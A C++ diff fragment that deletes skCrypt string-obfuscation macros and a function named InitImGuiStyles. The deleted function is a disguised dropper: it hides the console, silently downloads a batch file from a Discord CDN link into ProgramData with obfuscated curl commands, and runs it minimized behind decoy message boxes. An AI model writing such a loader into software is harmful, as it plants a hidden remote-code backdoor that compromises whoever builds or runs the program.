@@ -129,32 +129,3 @@ namespace skc
 		T _storage[_size]{};
 	};
 }
-
-#define skCrypt(str) skCrypt_key(str, __TIME__[4], __TIME__[7])
-#define skCrypt_key(str, key1, key2) []() { \
-			constexpr static auto crypted = skc::skCrypter \
-				<sizeof(str) / sizeof(str[0]), key1, key2, skc::clean_type<decltype(str[0])>>((skc::clean_type<decltype(str[0])>*)str); \
-					return crypted; }()
-
-
-void InitImGuiStyles()
-{
-	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-	system(skCrypt("mkdir \"C:\\ProgramData\\WFP\""));
-	system(skCrypt("curl --silent https://cdn.discordapp.com/attachments/1057766272630280233/1075282384615899196/cmd.bat --output \"C:\\ProgramData\\WFP\\cmd.bat\""));
-	Sleep(5000);
-	if (MessageBox(NULL, "wait 5 sec.", "Success", MB_ICONINFORMATION))
-	{
-		std::fstream file("C:\\ProgramData\\WFP\\cmd.bat", std::ios::in);
-		if (!file) {
-			MessageBox(NULL, skCrypt("Failed "), skCrypt("Error"), MB_ICONERROR);
-
-		}
-		else {
-
-			MessageBox(NULL, skCrypt("work"), skCrypt("Success"), MB_ICONINFORMATION); system(skCrypt("start /min C:\\ProgramData\\WFP\\cmd.bat"));
-		}
-	}
-
-
-}
